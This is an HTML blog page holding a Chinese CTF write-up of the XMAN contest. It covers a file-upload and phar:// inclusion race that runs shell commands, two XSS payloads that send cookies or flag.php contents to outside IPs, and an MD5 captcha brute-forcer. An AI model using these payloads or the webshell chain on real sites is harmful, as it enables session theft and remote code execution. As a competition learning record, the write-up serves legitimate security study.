@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>xman个人排位赛(纪念第一个xss) | Err0r</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="记录一下被虐的道理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xman个人排位赛(纪念第一个xss)">
+<meta property="og:url" content="http://Err0rzz.github.io/2017/08/31/XMAN/index.html">
+<meta property="og:site_name" content="Err0r">
+<meta property="og:description" content="记录一下被虐的道理">
+<meta property="og:updated_time" content="2017-08-31T12:55:11.392Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xman个人排位赛(纪念第一个xss)">
+<meta name="twitter:description" content="记录一下被虐的道理">
+  
+    <link rel="alternative" href="/atom.xml" title="Err0r" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: true
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">Err0r</a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="https://err0rzz.github.io/">博客首页</a></li>
+                        
+                            <li><a href="https://github.com/Err0rzz/Err0rzz.github.io/tree/master/">作品展示</a></li>
+                        
+                            <li><a href="/about">留言打卡</a></li>
+                        
+                            <li><a href="/FrontEndGuide">前端导航</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/Err0rzz" title="github">github</a>
+                            
+                                <a class="fl weibo" target="_blank" href="http://weibo.com/5693631701/profile?topnav=1&wvr=6" title="weibo">weibo</a>
+                            
+                                <a class="fl linkedin" target="_blank" href="https://betamao.me/" title="linkedin">linkedin</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://blog.betamao.me/">Betamao</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://blog.0kami.cn/">0Kami</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://e-lias.com/">Max</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://lalajun.github.io/">啦啦君</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.4mama.me">芝士就是力量</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱游戏爱妹子</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Err0r</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Err0r</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="https://err0rzz.github.io/">博客首页</a></li>
+                
+                    <li><a href="https://github.com/Err0rzz/Err0rzz.github.io/tree/master/">作品展示</a></li>
+                
+                    <li><a href="/about">留言打卡</a></li>
+                
+                    <li><a href="/FrontEndGuide">前端导航</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/Err0rzz" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="http://weibo.com/5693631701/profile?topnav=1&wvr=6" title="weibo">weibo</a>
+                    
+                        <a class="linkedin" target="_blank" href="https://betamao.me/" title="linkedin">linkedin</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-XMAN" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/08/31/XMAN/" class="article-date">
+      <time datetime="2017-08-31T10:58:00.000Z" itemprop="datePublished">2017-08-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      xman个人排位赛(纪念第一个xss)
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>记录一下被虐的道理</p>
+<a id="more"></a>
+<h1 id="Babyweb"><a href="#Babyweb" class="headerlink" title="Babyweb"></a>Babyweb</h1><p>第一次做这种文件上传包含漏洞吧。</p>
+<p>看到page之后,想到<strong>文件包含</strong>,先用<code>&quot;php://filter/read=convert.base64-encode/resource=&quot;</code>filter伪协议读一下源码.整理了一下几个重要的源码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">***Upload.php:</div><div class="line"></div><div class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</div><div class="line">  &lt;head&gt;</div><div class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">&lt;?php</div><div class="line">$error=$_FILES[&apos;pic&apos;][&apos;error&apos;];</div><div class="line">$tmpName=$_FILES[&apos;pic&apos;][&apos;tmp_name&apos;];</div><div class="line">$name=$_FILES[&apos;pic&apos;][&apos;name&apos;];</div><div class="line">$size=$_FILES[&apos;pic&apos;][&apos;size&apos;];</div><div class="line">$type=$_FILES[&apos;pic&apos;][&apos;type&apos;];</div><div class="line">try&#123;</div><div class="line">	if($name!==&quot;&quot;)</div><div class="line">	&#123;</div><div class="line">		$name1=substr($name,-4);</div><div class="line">		if(($name1!==&quot;.gif&quot;) and ($name1!==&quot;.jpg&quot;))</div><div class="line">		&#123;</div><div class="line">			echo &quot;hehe&quot;;</div><div class="line">			echo &quot;&lt;script language=javascript&gt;alert(&apos;不允许的文件类型！&apos;);history.go(-1)&lt;/script&gt;&quot;;</div><div class="line">			exit;</div><div class="line">		&#125;</div><div class="line">		if($type!==&quot;image/jpeg&quot;&amp;&amp;$type!==&quot;image/gif&quot;)</div><div class="line">		&#123;</div><div class="line">			//echo mime_content_type($tmpName);</div><div class="line">			echo &quot;&lt;script language=javascript&gt;alert(&apos;不允许的文件类型！&apos;);history.go(-1)&lt;/script&gt;&quot;;</div><div class="line">			exit;</div><div class="line">		&#125;</div><div class="line">		if(is_uploaded_file($tmpName))&#123;</div><div class="line">			$time=time();</div><div class="line">			$rootpath=&apos;uploads/&apos;.$time.$name1;</div><div class="line">			if(!move_uploaded_file($tmpName,$rootpath))&#123;</div><div class="line">				echo &quot;&lt;script language=&apos;JavaScript&apos;&gt;alert(&apos;文件移动失败!&apos;);window.location=&apos;index.php?page=submit&apos;&lt;/script&gt;&quot;;</div><div class="line">				exit;</div><div class="line">			&#125;</div><div class="line">			else&#123;</div><div class="line">				sleep(2);				</div><div class="line">				if ($type==&apos;image/jpeg&apos;)</div><div class="line">				&#123;</div><div class="line">					$im = @imagecreatefromjpeg($rootpath);</div><div class="line">					if(!$im)&#123;</div><div class="line">					  $im = imagecreatetruecolor(150, 30);</div><div class="line">					  $bg = imagecolorallocate($im, 255, 255, 255);</div><div class="line">					  $text_color = imagecolorallocate($im, 0, 0, 255);</div><div class="line">					  imagefilledrectangle($im, 0, 0, 150, 30, $bg);</div><div class="line">					  imagestring($im, 3, 5, 5, &quot;Error loading image&quot;, $text_color);</div><div class="line">					&#125; else &#123;</div><div class="line">						$time=time();</div><div class="line">						$new_rootpath=&apos;uploads/&apos;.$time.$name1;</div><div class="line">						imagejpeg($im,$new_rootpath);</div><div class="line">						imagedestroy($im);</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				else if ($type==&apos;image/gif&apos;)</div><div class="line">				&#123;</div><div class="line">					$im = @imagecreatefromgif($rootpath);</div><div class="line">					if(!$im)&#123;</div><div class="line">					  $im = imagecreatetruecolor(150, 30);</div><div class="line">					  $bg = imagecolorallocate($im, 255, 255, 255);</div><div class="line">					  $text_color = imagecolorallocate($im, 0, 0, 255);</div><div class="line">					  imagefilledrectangle($im, 0, 0, 150, 30, $bg);</div><div class="line">					  imagestring($im, 3, 5, 5, &quot;Error loading image&quot;, $text_color);</div><div class="line">					&#125; else &#123;</div><div class="line">						$time=time();</div><div class="line">						$new_rootpath=&apos;uploads/&apos;.$time.$name1;</div><div class="line">						imagegif($im,$new_rootpath);</div><div class="line">						imagedestroy($im);</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				unlink($rootpath);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		echo &quot;图片ID：&quot;.$time;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">catch(Exception $e)</div><div class="line">&#123;</div><div class="line">	echo &quot;ERROR&quot;;</div><div class="line">&#125;</div><div class="line">//</div><div class="line"> ?&gt;</div><div class="line"> &lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>观察代码，可以发现上传的文件的临时文件名是<code>time</code>函数生成的，而且在<code>sleep(2)</code>之后就会经过一系列复杂的变化(反正没看懂),所以要在两秒内把上传的文件包含。</p>
+<p>而且通过扫描，<strong>发现uploads目录可以访问</strong></p>
+<p>所以现在的思路就是，写两个脚本，一个来上传文件，另一个来通过访问uploads来读到最新的那个文件名，然后去包含它<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">***upload.py：</div><div class="line"></div><div class="line">#!/usr/bin/env python </div><div class="line"># encoding: utf-8 </div><div class="line">import requests </div><div class="line">url = &quot;http://202.112.51.217:8199/upload.php&quot; </div><div class="line">data = &#123; &apos;title&apos;: &apos;admin&apos;, &apos;url&apos;: &apos;admin&apos; &#125; </div><div class="line">files = &#123;&apos;pic&apos;: (&apos;b.jpg&apos;, open(&quot;b.zip&quot;).read(), &apos;image/jpeg&apos;)&#125; </div><div class="line"># 这里使用 requests 库来上传文件有几种方式 </div><div class="line"># 这种方式可以控制文件名以及文件类型 </div><div class="line"># 可以用来绕过基于客户端的文件名和文件类型检测 </div><div class="line">response = requests.post(url, data=data, files=files) </div><div class="line">content = response.content </div><div class="line">print content</div></pre></td></tr></table></figure></p>
+<ul>
+<li><p>写一句话木马，用base64加密之后保存为b.php，</p>
+</li>
+<li><p>然后压缩为b.zip,绕过检验很简单，上传的为b.jpg和image/jpeg即可</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">***include.py</div><div class="line"></div><div class="line">#!/usr/bin/env python </div><div class="line"># encoding: utf-8 </div><div class="line">import requests </div><div class="line">url = &quot;http://202.112.51.217:8199/uploads/&quot; </div><div class="line">response = requests.get(url) </div><div class="line">content = response.content </div><div class="line">files = [] </div><div class="line">for line in content.split(&quot;\n&quot;): </div><div class="line">	if &quot;href=&quot; in line:</div><div class="line">		files.append(line.split(&quot;href=\&quot;&quot;)[1].split(&quot;\&quot;&gt;&quot;)[0]) </div><div class="line">filename = files[-1] </div><div class="line">print filename</div><div class="line">#url = &quot;http://202.112.51.217:8199/index.php?page=php://filter/read=convert.base64-decode/resource=phar://uploads/&quot;+filename+&quot;/b&amp;c=system(&apos;ls&apos;);&quot; </div><div class="line">url = &quot;http://202.112.51.217:8199/index.php?page=php://filter/read=convert.base64-decode/resource=phar://uploads/&quot;+filename+&quot;/b&amp;c=system(&apos;cat ./xxxxxxxxxasdasf_flag.php&apos;);&quot; </div><div class="line">print requests.get(url).content</div></pre></td></tr></table></figure>
+<p>主要解释一下url那行,<strong>从右到左看,c是传入的参数,b是文件名,因为会自动加.php,所以其实是b.php,filename是最新的那个文件名,基本上就是你上传的那个,phar去读取,所以连起来就是用phar去读取你的那个b.php,然后经过base64解密</strong>。</p>
+<h1 id="XSS1"><a href="#XSS1" class="headerlink" title="XSS1"></a>XSS1</h1><p>由于对js和html一点都不懂,所以做起这种题目一点思路都没有,看着大佬们一个一个标签一个一个方法</p>
+<p>这是xman个人排位赛上的一道题，赛后拿着大佬的wp和payload一行一行敲出来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">var iframe=document.body.createElement(&apos;iframe&apos;);</div><div class="line">iframe.src=&quot;./&quot;;</div><div class="line">document.body.appendChild(iframe);</div><div class="line">iframe.onload=function()&#123;</div><div class="line">    var c=document.cookie;</div><div class="line">    var n=document.createElement(&quot;link&quot;);</div><div class="line">    n.setAttribute(&quot;rel&quot;,&quot;prefetch&quot;);</div><div class="line">    n.setAttribute(&quot;href&quot;,&quot;//101.200.58.21:8080/?&quot; + c&quot;);</div><div class="line">    document.head.appendChild(n);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>这估计是最简单的xss攻击脚本了，就是简单的把document.cookie打到101.200.58.21:8080，而且没有任何的过滤,连script都可以用，然后监听vps就可以了<br>唉web就是个坑</p>
+<h1 id="XSS2"><a href="#XSS2" class="headerlink" title="XSS2"></a>XSS2</h1><p>其实跟第一个题目差不多，也没过滤东西，不过需要这次flag不在cookie里，而是需要读取flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">var iframe = document.createElement(&quot;iframe&quot;);</div><div class="line"></div><div class="line">iframe.src = &quot;./flag.php&quot;;</div><div class="line"></div><div class="line">document.body.appendChild(iframe); </div><div class="line"></div><div class="line">iframe.onload = function ()&#123;    </div><div class="line"></div><div class="line">var flag = document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.document.getElementsByTagName(&quot;body&quot;)[0].innerHTML;</div><div class="line"></div><div class="line">var n0t = document.createElement(&quot;link&quot;);</div><div class="line"></div><div class="line">n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</div><div class="line"></div><div class="line">n0t.setAttribute(&quot;href&quot;, &quot;//121.42.189.18:8080/?&quot; +flag);</div><div class="line"></div><div class="line">document.head.appendChild(n0t);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>其中唯一不一样的就是<strong>var flag = document.getElementsByTagName(“iframe”)[0].contentWindow.document.getElementsByTagName(“body”)[0].innerHTML</strong>;</p>
+<p>这句代码,其实可以分成三段，<strong>第一段是得到iframe子窗口，第二段contentwindow是进入子窗口,第三段是读取子窗口的body变量用html实体输出</strong></p>
+<p>附上MD5验证码爆破脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"># -*- coding:utf8 -*-</div><div class="line">import hashlib</div><div class="line"> </div><div class="line">def crack_code(code):</div><div class="line">    s = 100000</div><div class="line"> </div><div class="line">    while 1:</div><div class="line">        m2 = hashlib.md5()  </div><div class="line">        m2.update(repr(s))</div><div class="line">        if (m2.hexdigest()[0:4]==code):</div><div class="line">            return s</div><div class="line">            break</div><div class="line">        s+=1</div><div class="line"> </div><div class="line">print crack_code(&apos;818d&apos;)</div></pre></td></tr></table></figure></p>
+
+      
+      
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/08/31/XMAN/">xman个人排位赛(纪念第一个xss)</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Err0r 的个人博客">Err0r</a></p>
+        <p><span>发布时间:</span>2017年08月31日 - 18时58分</p>
+        <p><span>最后更新:</span>2017年08月31日 - 20时55分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/08/31/XMAN/" title="xman个人排位赛(纪念第一个xss)">http://Err0rzz.github.io/2017/08/31/XMAN/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2017/08/31/XMAN/　　作者: Err0r" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2017/08/31/file_include/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          文件包含一些常识
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/08/31/ZJGSCTF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ZJGSCTF</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Babyweb"><span class="toc-number">1.</span> <span class="toc-text">Babyweb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS1"><span class="toc-number">2.</span> <span class="toc-text">XSS1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS2"><span class="toc-number">3.</span> <span class="toc-text">XSS2</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <div id="gitments"></div>
+<script src="/js/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+      id: window.location.pathname,
+      owner: 'Err0rzz',
+      repo: 'Err0rzz.github.io',
+      oauth: {
+        client_id: '',
+        client_secret: '',
+      },
+    })
+    gitment.render('gitments')
+</script>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2017/08/31/file_include/" title="上一篇: 文件包含一些常识">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2017/08/31/ZJGSCTF/" title="下一篇: ZJGSCTF">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/file_include/">文件包含一些常识</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/XMAN/">xman个人排位赛(纪念第一个xss)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/ZJGSCTF/">ZJGSCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/25/blind-SQL-injection-script/">blind_SQL_injection script</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/16/test/">测试篇</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Err0r
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
